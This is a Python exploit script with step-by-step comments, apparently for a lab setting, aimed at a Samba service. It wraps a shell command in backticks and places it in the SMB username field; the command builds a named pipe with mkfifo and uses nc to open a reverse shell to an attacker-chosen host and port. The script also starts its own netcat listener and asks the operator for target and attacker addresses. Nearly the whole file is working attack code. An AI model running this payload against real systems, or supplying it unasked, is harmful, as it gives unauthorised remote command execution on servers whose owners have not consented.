import sys
import subprocess
from smb.SMBConnection import SMBConnection
import time

def exploit(rhost, rport, lhost, lport):

    # pipe is used to create a pipe called /tmp/intruder, this will allow for data to be passed between processes
    pipe = 'mkfifo /tmp/intruder; '

    # Creates a connection to our machine and reads input from the /tmp/intruder file
    ncSetup = f'nc {lhost} {lport} 0</tmp/intruder '

    # starts a shell on the targeted mahine and redirect input and output from /bin/sh to /tmp/intruder so that only we see what is being executed
    shellSetup = '| /bin/sh >/tmp/intruder 2>&1; '

    # removes the folder after the payload has been executed
    cleanup = 'rm /tmp/intruder'

    # This is the complete payload
    payload = pipe + ncSetup + shellSetup + cleanup

    # This version of Samba does not ensure that usernames do not contain malicious code when implemented
    # This allows us to set our payload as our Username and send it to the targeted machine
    username = "`" + payload + "`"

    # SMBConnection allows us to initialize a connection over the SMB protocol
    # username is used as our username to authenticate ourself with the remote Samba server
    conn = SMBConnection(username, " ", " ", " ")

    # attempt the connection with the targeted machine
    conn.connect(rhost, rport, timeout=3)

    print("Success! Check Netcat!")

# We want to run netcat in another terminal so that we have access to the targeted machine once we exploit it
def ncListener(localPort):

    # This runs netcat to listen for a connection on the port that we specified on our machine
    # nlvp tells netcat to not perform a DNS lookup, to operate in listen mode, to use verbose mode, and to allow for the specification of a specific port
    command = f"nc -nlvp {localPort}"

    # This opens a new terminal and runs the netcat command
    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', command])

if __name__ == '__main__':

    print("Samba Exploit Script")

    # Prompts user for the remote host, remote ports, local host, and local port
    userInput = input("Usage: <RHOST> <RPORT> <LHOST> <LPORT>\n")

    while len(userInput.split()) != 4:
        print("Incorrect Input")
        userInput = input("Usage: <RHOST> <RPORT> <LHOST> <LPORT>\n")

    # split the input from the command line into the correct vars
    splitInput = userInput.split()

    print("Attempting Exploit")

    rhost = splitInput[0]
    rport = splitInput[1]
    lhost = splitInput[2]
    lport = splitInput[3]


    ncListener(lport)
    time.sleep(2)

    exploit(rhost, rport, lhost, lport)
